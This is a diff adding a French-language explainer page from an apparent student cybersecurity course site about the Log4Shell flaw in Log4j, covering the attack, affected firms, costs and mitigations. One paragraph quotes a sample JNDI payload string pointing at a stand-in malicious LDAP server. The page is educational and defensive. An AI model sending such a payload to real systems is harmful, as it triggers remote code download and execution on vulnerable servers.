@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Article 5</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles/style.css">
+  <link rel="icon" type="image/x-icon" href="/images/piou.ico">
+</head>
+
+<body>
+  <header>
+    <a href="/index.html"><h1>Cours de Cyber</h1></a>
+    <nav>
+      <a href="/index.html">Accueil</a>
+      <a href="#">À propos</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <main>
+    <section class="content">
+    <div>
+      <h2>La cyberattaque Log4Shell</h2>
+      <div class="article-meta">Publié le 02 juilet 2025</div>
+        <section>
+            <section>
+    <h3>🔓 Quelle est la vulnérabilité exploitée ?</h3>
+    <p>La faille <strong>Log4Shell</strong> (CVE-2021-44228), découverte en décembre 2021, touche <strong>Log4j</strong>, une bibliothèque Java très répandue utilisée pour la journalisation des événements dans les applications. Cette vulnérabilité critique permettait à un attaquant d’exécuter du code arbitraire à distance en insérant une chaîne malveillante dans les logs d’une application, grâce à la fonctionnalité de recherche JNDI (Java Naming and Directory Interface). Une simple requête web contenant cette chaîne pouvait activer l’exploitation, sans authentification préalable.</p>
+  </section>
+
+  <section>
+    <h3>🧨 Comment l’attaque s’est-elle déroulée ?</h3>
+    <p>Les attaquants ont profité du fait que de nombreuses applications web, serveurs, plateformes cloud ou services backend utilisent Log4j pour enregistrer les données entrantes. En envoyant des chaînes spécialement conçues, comme : ${jndi:ldap://malicious-server.com/a}, dans les champs de requête HTTP (user-agent, paramètres, etc.), Log4j les interprétait automatiquement. Cette évaluation déclenchait une connexion à un serveur distant malveillant, permettant le téléchargement et l’exécution d’un code arbitraire sur la machine ciblée. Le caractère extrêmement simple de l’exploitation a facilité une vague mondiale d’attaques automatisées dès les premières heures suivant sa divulgation.</p>
+  </section>
+
+  <section>
+    <h3>🎯 Qui a été touché ?</h3>
+    <p>Des millions de systèmes à travers le monde étaient potentiellement vulnérables. La faille affectait une vaste gamme d’organisations, de petites entreprises à des géants du numérique. Parmi les premières cibles confirmées, on retrouve <strong>Apple, Amazon, Cloudflare, Steam, Twitter, Tesla, Minecraft</strong> et de nombreuses institutions publiques. Même des objets connectés, comme des caméras IP ou des routeurs, étaient exposés si leur firmware incluait Log4j.</p>
+  </section>
+
+  <section>
+    <h3>💥 Quels ont été les impacts ?</h3>
+    <p>Les conséquences ont été sérieuses. Des attaques de minage de cryptomonnaies (cryptojacking), des vols de données, des installations de backdoors et des mouvements latéraux dans les réseaux internes ont été observés. De nombreuses entreprises ont dû déconnecter temporairement des systèmes critiques pour vérifier leur exposition. La peur d’une compromission silencieuse a conduit à un effort mondial d’analyse de logs et de mise à jour en urgence.</p>
+  </section>
+
+  <section>
+    <h3>💰 Coût estimé selon la taille de l’entreprise</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>Taille d’entreprise</th>
+          <th>Coût estimé moyen</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Petite entreprise (&lt;50 salariés)</td>
+          <td>Entre 15 000 € et 80 000 €</td>
+        </tr>
+        <tr>
+          <td>Moyenne entreprise (50 à 250 salariés)</td>
+          <td>Entre 80 000 € et 500 000 €</td>
+        </tr>
+        <tr>
+          <td>Grande entreprise (&gt;250 salariés)</td>
+          <td>Plusieurs millions d’euros (dépasse souvent les 5 à 10 millions €)</td>
+        </tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section>
+    <h3>🛡️ Comment s’en protéger ?</h3>
+    <p>La meilleure défense consiste à mettre à jour immédiatement Log4j vers une version corrigée (≥ 2.17.0). Il est aussi crucial de scanner toutes les dépendances logicielles (via des outils comme <code>Log4j Detector</code> ou <code>SBOM</code>) pour identifier d’éventuels composants vulnérables indirectement intégrés. La désactivation de la fonctionnalité JNDI dans les versions vulnérables est également une mesure temporaire utile. Il est recommandé d’appliquer le principe de moindre privilège sur les serveurs, d’analyser les logs à la recherche de comportements suspects, et d’utiliser un pare-feu applicatif (WAF) capable de bloquer les chaînes d’attaque les plus courantes.</p>
+  </section>
+
+  <section>
+    <h3>🤔 Pourquoi est-ce difficile à éviter ?</h3>
+    <p>Log4Shell est particulièrement redoutable car Log4j est utilisé dans d’innombrables produits, parfois sans que les équipes techniques ne le sachent (dans des dépendances de dépendances). Le code vulnérable peut être enfoui dans des bibliothèques tierces, rendant sa détection complexe. De plus, la simplicité d’exploitation a permis à des milliers d’attaquants — professionnels comme amateurs — de scanner Internet en quête de cibles, souvent en quelques secondes. Même après avoir corrigé Log4j, il reste difficile de savoir si une compromission a eu lieu avant le correctif, d’où l’importance d’une surveillance continue et approfondie.</p>
+  </section>
+
+  <section>
+    <h3>🏢 Dans le contexte de notre entreprise, que ferions-nous ?</h3>
+    <p>Dans notre organisation, nous commencerions par un audit complet des dépendances logicielles utilisées dans nos applications et infrastructures. Nous mettrions en œuvre un inventaire logiciel automatisé pour détecter les versions vulnérables de Log4j, y compris dans les conteneurs et machines virtuelles. Les versions affectées seraient immédiatement mises à jour ou isolées. En parallèle, nous renforcerions la détection des intrusions et l’analyse des logs réseau, tout en sensibilisant les développeurs à la gestion sécurisée des bibliothèques open source. Enfin, un processus de réponse aux incidents serait affiné pour réagir rapidement à toute nouvelle vulnérabilité critique.</p>
+  </section>
+
+        </section>
+    </div>
+    </section>
+    
+
+    <aside class="sidebar">
+      <h3>À propos</h3>
+      <p>Lorem ipsum dolor sit, amet consectetur adipisicing elit.<br>-Thibaut François 2025</p>
+      <h3>Catégories</h3>
+      <ul>
+        <li><a href="#">Web</a></li>
+        <li><a target="_blank" href="https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley">Vérité Absolue</a></li>
+        <li><a target="_blank" href="https://www.securite-routiere.gouv.fr/passer-son-permis-de-conduire/preparation-de-lexamen-du-code-de-la-route">Code</a></li>
+      </ul>
+    </aside>
+  </main>
+
+  <footer>
+    <p>&copy; 2025 Cours de Cybersécurité. Tous droits réservés.</p>
+  </footer>
+</body>
+</html>
